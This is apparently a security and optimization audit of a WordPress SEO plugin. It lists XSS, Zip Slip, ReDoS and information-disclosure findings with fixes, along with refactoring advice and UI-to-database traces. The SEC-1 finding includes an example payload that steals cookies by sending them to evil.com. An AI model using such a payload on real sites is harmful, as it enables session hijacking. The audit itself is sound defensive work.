# Mantis SEO — Comprehensive Code Analysis Report

> **Date:** 2026-03-21
> **Scope:** Full security audit, optimization review, and layer-by-layer traceability analysis
> **Files Analyzed:** 23 source files (~6,400 lines of PHP + JS)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Security Analysis](#security-analysis)
3. [Optimization Analysis](#optimization-analysis)
4. [Traceability Analysis](#traceability-analysis)
5. [Recommendations Priority Matrix](#recommendations-priority-matrix)

---

## Executive Summary

The Mantis SEO plugin is well-structured and follows WordPress best practices in most areas. The traceability analysis confirmed that **all UI elements connect correctly through every layer to the database and back** — no broken call chains, mismatched signatures, or missing handlers were found.

However, the security audit uncovered **2 critical**, **3 high**, **4 medium**, and **2 low** severity issues. The optimization review found **3 high-impact**, **14 medium-impact**, and **10 low-impact** improvements.

**Top Priority Items:**
1. 🔴 **CRITICAL** — JSON-LD XSS via `</script>` injection in schema output
2. 🔴 **CRITICAL** — Zip Slip path traversal in `deploy.php`
3. 🟠 **HIGH** — Noindex posts appearing in sitemaps (SEO correctness)
4. 🟠 **HIGH** — `deploy.log` publicly accessible (info disclosure)
5. 🟠 **HIGH** — Regex injection / ReDoS in redirect matching
6. 🟠 **HIGH** — `deploy.php` loading `wp-config.php` in public endpoint
7. 🟠 **HIGH** — Duplicated meta save logic (`save_metabox` / `ajax_save_meta`)

---

## Security Analysis

### CRITICAL Issues

#### SEC-1: Stored XSS via JSON-LD Script Tag
- **File:** `includes/class-schema.php`, lines 33–42
- **Category:** Cross-Site Scripting (XSS)
- **Description:** `wp_json_encode()` is called with `JSON_UNESCAPED_SLASHES`, then injected directly into a `<script>` tag. If any value in the schema graph contains `</script>`, the JSON-LD block is prematurely closed and arbitrary HTML/JS is injected. Post titles, author names, and descriptions are included in the schema and are controllable by anyone with the Author role or above.
- **Attack vector:** A user with Author privileges creates a post titled `Test</script><script>document.location='https://evil.com/'+document.cookie</script>` — this value flows into the Article `headline` and WebPage `name`, breaking out of the JSON-LD block.
- **Vulnerable code:**
  ```php
  $json = wp_json_encode( $data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
  echo '<script type="application/ld+json">' . $json . '</script>';
  ```
- **Fix:** Remove `JSON_UNESCAPED_SLASHES` so that `/` is escaped as `\/`, preventing `</script>` injection:
  ```php
  $json = wp_json_encode( $data, JSON_UNESCAPED_UNICODE );
  ```

#### SEC-2: Zip Slip Path Traversal in deploy.php
- **File:** `deploy.php`, lines 180–183
- **Category:** Path Traversal / Arbitrary File Write
- **Description:** `ZipArchive::extractTo()` on PHP 7.4 does NOT sanitize `../` path components in zip entry filenames. A malicious zip archive could contain entries like `../../../wp-config.php` and overwrite arbitrary files on the server.
- **Fix:** Validate each entry name before extraction:
  ```php
  for ( $i = 0; $i < $zip->numFiles; $i++ ) {
      $name = $zip->getNameIndex( $i );
      if ( strpos( $name, '..' ) !== false ) {
          $zip->close();
          respond( [ 'error' => 'Invalid archive contents' ], 400 );
      }
  }
  ```

### HIGH Issues

#### SEC-3: Publicly Accessible Deploy Log
- **File:** `deploy.php`, lines 52, 56
- **Category:** Information Disclosure
- **Description:** `deploy.log` is written into the plugin's web-accessible root directory. Anyone can access it and read commit SHAs, repository names, timestamps, and error messages.
- **Fix:** Write the log outside the web root, or add an `.htaccess` deny rule.

#### SEC-4: Regex Injection / ReDoS in Redirect Matching
- **File:** `includes/class-redirects.php`, lines 204–206
- **Category:** Regex DoS
- **Description:** Regex redirect patterns from the database are injected directly into `preg_match()` and `preg_replace()` without validation. A catastrophically backtracking regex stored by an admin would cause every single front-end request to hang.
- **Fix:** Validate regex patterns on save; escape the `#` delimiter; log regex errors instead of suppressing with `@`.

#### SEC-5: Loading wp-config.php in Public Endpoint
- **File:** `deploy.php`, lines 27–29
- **Category:** Information Disclosure / Attack Surface
- **Description:** If `deploy-config.php` is missing, the script attempts to `require_once` wp-config.php, loading database credentials into a standalone, publicly accessible PHP script.
- **Fix:** Require `deploy-config.php` exclusively; refuse to run if missing.

### MEDIUM Issues

#### SEC-6: DOM XSS via innerHTML in media-upload.js
- **File:** `assets/js/media-upload.js`, line 39
- **Description:** Image preview uses `innerHTML` with a URL value. Use DOM APIs instead.
- **Fix:** `var img = document.createElement('img'); img.src = url; previewEl.appendChild(img);`

#### SEC-7: Unvalidated Redirect Type
- **File:** `includes/class-redirects.php`, line 262
- **Description:** `wp_redirect()` accepts any integer as the HTTP status code. Validate against allowed types.
- **Fix:** Whitelist allowed status codes: `array(301, 302, 307, 308, 410, 451)`.

#### SEC-8: Predictable Temp Directory Name
- **File:** `deploy.php`, line 165
- **Description:** `uniqid()` generates a predictable value. Use `bin2hex(random_bytes(16))` instead.

#### SEC-9: deploy.php Has No Rate Limiting
- **File:** `deploy.php`
- **Description:** No lock mechanism prevents concurrent deploys or flood attacks.
- **Fix:** Add a file-based lock with `flock()`.

### LOW Issues

#### SEC-10: Table Name Interpolation in uninstall.php
- **File:** `uninstall.php`, line 15
- **Description:** Acceptable WP pattern — add PHPCS ignore comment.

#### SEC-11: Missing Capability Check for Term Meta Save
- **File:** `admin/class-metabox.php`, line 513
- **Description:** `save_term_meta()` doesn't check `current_user_can('edit_term', $term_id)`.
- **Fix:** Add the capability check.

---

## Optimization Analysis

### Code Duplication (6 issues)

#### OPT-1: Duplicated meta save logic [HIGH]
- **File:** `admin/class-metabox.php`, lines 336–384 and 389–442
- **Description:** `save_metabox()` and `ajax_save_meta()` contain ~50 lines of nearly identical field sanitization, default-template comparison, and checkbox handling.
- **Fix:** Extract a private `save_fields_for_post($post_id, $post_type, $data)` method.

#### OPT-2: Duplicated replacement-variable map [MEDIUM]
- **File:** `includes/class-meta.php`, lines 454–488 and 511–539
- **Description:** `replace_vars()` and `get_replacements_for_preview()` build almost the same `$replacements` array.
- **Fix:** Have `replace_vars()` call `get_replacements_for_preview()` and layer on pagination.

#### OPT-3: Duplicated title-template resolution logic [MEDIUM]
- **File:** `includes/class-meta.php`, lines 164–179, 336–348, 364–383, 403–412
- **Description:** "Check custom meta title → fall back to settings template → resolve variables" is repeated four times.
- **Fix:** Create a single `resolve_title($post)` method.

#### OPT-4: Duplicated default template helpers [LOW]
- **File:** `admin/class-metabox.php`, lines 232–251
- **Description:** `get_effective_default_title_template()` and `get_effective_default_metadesc_template()` replicate logic from `class-meta.php`.
- **Fix:** Move to a shared static method.

#### OPT-5: Duplicated META_PREFIX constant [LOW]
- **Files:** `includes/class-meta.php:22` and `admin/class-metabox.php:22`
- **Fix:** Define in one class, reference from the other.

#### OPT-6: Duplicated JS variable insert dropdown logic [MEDIUM]
- **Files:** `admin-metabox.js` and `mantis-template-editor.js`
- **Fix:** Move dropdown toggle/close logic into `MantisTemplateEditor`.

### Dead Code (3 issues)

#### OPT-7: Unused variable `$commit_msg` [LOW]
- **File:** `deploy.php`, line 248
- **Fix:** Remove it.

#### OPT-8: `focus_keyword` meta saved but never used [LOW]
- **File:** `admin/class-metabox.php:310`
- **Description:** Stored per-post and per-term but no front-end code reads it.
- **Fix:** Document as user reference field or implement keyword analysis.

#### OPT-9: Redundant `$skip_keys` in Yoast importer [LOW]
- **File:** `includes/class-yoast-importer.php`, lines 42–49
- **Fix:** Remove or document as defensive.

### Performance (6 issues)

#### OPT-10: `get_settings()` called repeatedly with no caching [MEDIUM]
- **File:** `includes/class-mantis-seo.php`, line 103
- **Description:** Called 8+ times per front-end page load.
- **Fix:** Cache in a static property; invalidate on `save_settings()`.

#### OPT-11: Regex redirects loaded from DB on every request [MEDIUM]
- **File:** `includes/class-redirects.php`, line 201
- **Description:** `SELECT * FROM ... WHERE format = 'regex'` runs on every front-end request.
- **Fix:** Add transient caching or early exit for admin pages.

#### OPT-12: Sitemap includes noindex posts [HIGH — SEO correctness]
- **File:** `includes/class-sitemap-posts.php`, lines 83–91
- **Description:** Posts marked with `_mantis_robots_noindex = '1'` still appear in the sitemap.
- **Fix:** Add a `meta_query` excluding noindex posts.

#### OPT-13: `get_post()` called multiple times for same object [LOW]
- **File:** `includes/class-meta.php`, multiple locations
- **Fix:** Store queried post object once, pass down.

#### OPT-14: Thumbnail URL fetched twice (OG and Twitter) [LOW]
- **File:** `includes/class-meta.php`, lines 293 and 319
- **Fix:** Compute once, pass to both builders.

#### OPT-15: `normalize_origin()` calls `home_url()` every time [LOW]
- **File:** `includes/class-redirects.php`, line 225
- **Fix:** Cache in static variable.

### Functions Too Long (3 issues)

#### OPT-16: `render_metabox()` is 160 lines [MEDIUM]
- **File:** `admin/class-metabox.php`, lines 64–224
- **Fix:** Break into `render_preview()`, `render_tab_nav()`, `render_field()`, etc.

#### OPT-17: `render()` is ~400 lines [MEDIUM]
- **File:** `admin/class-settings-page.php`, lines 496–892
- **Fix:** Break each panel into a partial file.

#### OPT-18: `migrate_settings()` is ~108 lines [LOW]
- **File:** `includes/class-yoast-importer.php`, lines 376–484
- **Fix:** Extract key-mapping into helper methods.

### WordPress Best Practices (6 issues)

#### OPT-19: `deploy.php` bypasses WordPress [HIGH]
- **Description:** Standalone PHP script reachable by HTTP without WP security.
- **Fix:** Consider implementing as a REST API endpoint or protect with .htaccess.

#### OPT-20: Inline JavaScript in settings page [MEDIUM]
- **File:** `admin/class-settings-page.php`, lines 847–889
- **Fix:** Move to `assets/js/admin-settings.js`.

#### OPT-21: Inline dark-mode script duplicated [LOW]
- **Files:** `class-settings-page.php:543` and `class-redirects-page.php:120`
- **Fix:** Move to app-header partial or tiny enqueued JS file.

#### OPT-22: `uninstall.php` doesn't clean up post/term meta [MEDIUM]
- **File:** `uninstall.php`, lines 14–19
- **Fix:** Add `DELETE FROM $wpdb->postmeta WHERE meta_key LIKE '_mantis_%'` and same for termmeta.

#### OPT-23: `get_all()` loads all redirects with no pagination [MEDIUM]
- **File:** `includes/class-redirects.php`, lines 70–73
- **Fix:** Add pagination support.

#### OPT-24: Yoast migration loads ALL meta into memory [MEDIUM]
- **File:** `includes/class-yoast-importer.php`, lines 108–109
- **Fix:** Process in batches.

### Correctness (4 issues)

#### OPT-25: Sitemap lastmod uses current time instead of actual modification date [MEDIUM]
- **Files:** `class-sitemap-terms.php:110` and `class-sitemap-posts.php:65`
- **Fix:** Query the most recent `post_modified` date.

#### OPT-26: `get_canonical_url()` doesn't handle pagination [MEDIUM]
- **File:** `includes/class-meta.php`, lines 583–586
- **Fix:** Use `wp_get_canonical_url()` or append pagination vars.

#### OPT-27: Identical textarea/input insert code in JS [LOW]
- **File:** `assets/js/admin-metabox.js`, lines 367–379
- **Fix:** Remove the unnecessary branch.

#### OPT-28: `parse_yoast_keywords_csv()` calls `get_post()` per row [MEDIUM]
- **File:** `admin/class-settings-page.php`, line 304
- **Fix:** Batch-query with `get_posts(['post__in' => $ids])`.

---

## Traceability Analysis

### Summary

**Every UI element was traced through all layers (UI → JS → PHP → Database → Response) and verified.**

**30+ UI elements** were analyzed across 4 pages (Settings, Redirects, Post Editor, Term Editor).

### Result: ✅ All Call Chains Are Correct

| Verification | Result |
|---|---|
| Every UI element calls the correct handler | ✅ |
| All handlers called with correct signatures and arguments | ✅ |
| Arguments have correct names and types throughout the chain | ✅ |
| Each layer passes data correctly to the next | ✅ |
| Return values properly handled back up the chain | ✅ |
| All WordPress hooks point to existing methods | ✅ |
| All JS event listeners reference elements that exist in HTML | ✅ |
| All AJAX calls use correct action name and handle responses | ✅ |
| All form submissions POST to right URL with correct field names | ✅ |
| All nonces created and verified consistently | ✅ |

### Detailed Traces

#### Settings Page (8 traces)
1. **Save Settings** — Form POST → `options.php` → `sanitize_settings()` → `update_option('mantis_settings')` → Database ✅
2. **Sidebar Navigation** — JS click handler → `showPanel()` → CSS toggle ✅
3. **Export** — GET link → `handle_export()` → `get_settings()` → JSON download ✅
4. **Import** — Form POST (multipart) → `handle_import()` → `parse_import_file()` → `save_settings()` → Database ✅
5. **Yoast Migration** — Form POST → `handle_migrate()` → `Yoast_Importer::migrate()` → Database ✅
6. **Template Editor** — `mantis-template-editor.js` → hidden input → form submit ✅
7. **Media Upload** — `media-upload.js` → `wp.media()` → input value ✅
8. **Dark Mode Toggle** — `admin-app.js` → localStorage ✅

#### Redirects Page (4 traces)
1. **Add Redirect** — Form POST → `handle_actions()` → `Redirects::add()` → Database ✅
2. **Edit Redirect** — GET link → `Redirects::get_by_id()` → form pre-fill ✅
3. **Delete Redirect** — Form POST → `handle_actions()` → `Redirects::delete()` → Database ✅
4. **Accordion Toggle** — `admin-app.js` → CSS class toggle ✅

#### Metabox / Post Editor (10 traces)
1. **Open Panel** — Button click → `admin-metabox.js openPanel()` ✅
2. **Close Panel** — × button / backdrop / Escape → `closePanel()` ✅
3. **Pin Toggle** — Button click → `togglePin()` ✅
4. **Resize Tab** — Button click → `toggleWide()` ✅
5. **Tab Switching** — Button click → `switchTab()` ✅
6. **Save SEO (AJAX)** — Button click → `fetch()` → `wp_ajax_mantis_seo_save_meta` → `ajax_save_meta()` → Database ✅
7. **Save via Form Submit** — `syncSlideoutToForm()` → hidden inputs → `save_metabox()` → Database ✅
8. **Variable Insert** — Dropdown click → `MantisTemplateEditor.insertVar()` ✅
9. **Live Preview** — Input events → `updatePreview()` → textContent updates ✅
10. **Block Editor Title Sync** — `wp.data.subscribe()` → `replaceVars` update → `updatePreview()` ✅

#### Term Editor (3 traces)
1. **Add Term Fields** — Hook render → form fields ✅
2. **Edit Term Fields** — Hook render → pre-filled fields ✅
3. **Save Term Meta** — Form POST → `save_term_meta()` → `update_term_meta()` → Database ✅

#### Frontend Output (5 traces)
1. **Meta Tags** — `wp_head` → `output_meta()` → Database → HTML output ✅
2. **Title Filter** — `pre_get_document_title` / `document_title_parts` → Database → filtered title ✅
3. **Schema JSON-LD** — `wp_head` → `output_schema()` → Database → `<script>` output ✅
4. **Sitemap** — Rewrite rule → `handle_request()` → providers → Database → XML output ✅
5. **Redirects** — `template_redirect` → `maybe_redirect()` → Database → `wp_redirect()` ✅

### Database Operations Map

| Storage | Table/Key | Read By | Written By |
|---|---|---|---|
| Settings | `wp_options.mantis_settings` | `get_settings()` | WP Settings API / `save_settings()` |
| Post Meta | `wp_postmeta._mantis_*` | `Mantis_SEO_Meta::get_post_meta()` | `save_metabox()` / `ajax_save_meta()` |
| Term Meta | `wp_termmeta._mantis_*` | `Mantis_SEO_Meta::get_term_meta()` | `save_term_meta()` |
| Redirects | `wp_mantis_redirects` | `get_all/get_by_id/get_match` | `add()` / `update()` / `delete()` |
| Notices | `wp_options.mantis_redirect_notice` | `show_redirect_notices()` | `maybe_store_redirect_notice()` |
| Migration | `wp_options.mantis_migrated_from_yoast` | Settings page | `Yoast_Importer::migrate()` |
| Update Cache | Transient `mantis_seo_github_release` | `Updater::get_release_data()` | Same |

---

## Recommendations Priority Matrix

| Priority | ID | Category | Description | Effort |
|---|---|---|---|---|
| 🔴 P0 | SEC-1 | Security | JSON-LD XSS — remove `JSON_UNESCAPED_SLASHES` | 5 min |
| 🔴 P0 | SEC-2 | Security | Zip Slip — validate zip entries before extraction | 15 min |
| 🟠 P1 | OPT-12 | SEO | Exclude noindex posts from sitemap | 15 min |
| 🟠 P1 | SEC-4 | Security | Validate regex patterns on redirect save | 30 min |
| 🟠 P1 | SEC-3 | Security | Move deploy.log outside web root | 10 min |
| 🟠 P1 | SEC-5 | Security | Remove wp-config.php fallback from deploy.php | 10 min |
| 🟠 P1 | OPT-1 | Code Quality | Extract shared meta save method | 30 min |
| 🟡 P2 | OPT-10 | Performance | Cache `get_settings()` result | 15 min |
| 🟡 P2 | OPT-22 | WP Practice | Clean up meta on uninstall | 10 min |
| 🟡 P2 | OPT-25 | Correctness | Fix sitemap lastmod to use actual dates | 20 min |
| 🟡 P2 | OPT-26 | Correctness | Fix canonical URL pagination | 15 min |
| 🟡 P2 | SEC-6 | Security | Replace innerHTML with DOM APIs | 10 min |
| 🟡 P2 | SEC-7 | Security | Whitelist redirect status codes | 10 min |
| 🟡 P2 | SEC-8 | Security | Use random_bytes for temp dir | 5 min |
| 🟡 P2 | SEC-11 | Security | Add capability check to term meta save | 5 min |
| 🟡 P2 | OPT-2 | Code Quality | Consolidate replace_vars maps | 20 min |
| 🟡 P2 | OPT-3 | Code Quality | Consolidate title resolution logic | 30 min |
| 🟡 P2 | OPT-11 | Performance | Cache regex redirects | 20 min |
| 🟢 P3 | OPT-20 | WP Practice | Move inline JS to external file | 20 min |
| 🟢 P3 | OPT-16 | Code Quality | Break up render_metabox() | 45 min |
| 🟢 P3 | OPT-17 | Code Quality | Break up settings render() | 60 min |
| 🟢 P3 | OPT-23 | Performance | Add redirect pagination | 30 min |
| 🟢 P3 | OPT-24 | Performance | Batch Yoast migration queries | 30 min |
| 🟢 P3 | OPT-28 | Performance | Batch CSV import post lookups | 15 min |
| ⚪ P4 | OPT-5 | Code Quality | Unify META_PREFIX constant | 5 min |
| ⚪ P4 | OPT-7 | Dead Code | Remove unused $commit_msg | 1 min |
| ⚪ P4 | OPT-9 | Dead Code | Remove redundant $skip_keys | 5 min |
| ⚪ P4 | OPT-21 | WP Practice | Deduplicate dark-mode inline script | 10 min |
| ⚪ P4 | OPT-27 | Code Quality | Remove identical textarea/input branch | 5 min |
| ⚪ P4 | SEC-9 | Security | Add deploy rate limiting | 15 min |
| ⚪ P4 | SEC-10 | Security | Add PHPCS comment for table name | 1 min |

### Positive Findings

The codebase demonstrates strong fundamentals:
- ✅ All PHP files check `defined('ABSPATH')`
- ✅ All forms verify nonces
- ✅ All admin pages check `manage_options` capability
- ✅ Input sanitization used consistently (`sanitize_text_field`, `esc_url_raw`, etc.)
- ✅ Output escaping used in all HTML output (`esc_html`, `esc_attr`, `esc_url`)
- ✅ `$wpdb->prepare()` used for all parameterized queries
- ✅ WordPress Settings API used properly with sanitize callback
- ✅ Upload validation with `is_uploaded_file()`
- ✅ Timing-safe HMAC comparison with `hash_equals()` in deploy webhook
- ✅ `wp_safe_redirect()` used in all admin redirect contexts
- ✅ JS uses `textContent` (not `innerHTML`) for user data in snippet preview
- ✅ Complete traceability — every UI action connects properly through all layers
